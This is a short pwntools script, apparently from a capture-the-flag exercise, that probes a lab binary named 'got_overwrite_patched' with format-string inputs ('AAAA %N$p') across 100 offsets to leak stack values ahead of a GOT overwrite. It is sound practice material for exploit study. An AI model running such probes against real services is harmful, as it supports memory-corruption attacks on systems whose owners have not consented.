#!/usr/bin/env python3

from pwn import *

exe = ELF("./got_overwrite_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():

    # good luck pwning :)

    context.log_level = 'warning'

    for i in range(100):
     try:
       r = conn()
       r.sendline('AAAA %{}$p'.format(i).encode())
       result = r.recvline()
       print(str(i) + ': ' + str(result))
       r.close
     except EOFError:
        pass

if __name__ == "__main__":
    main()
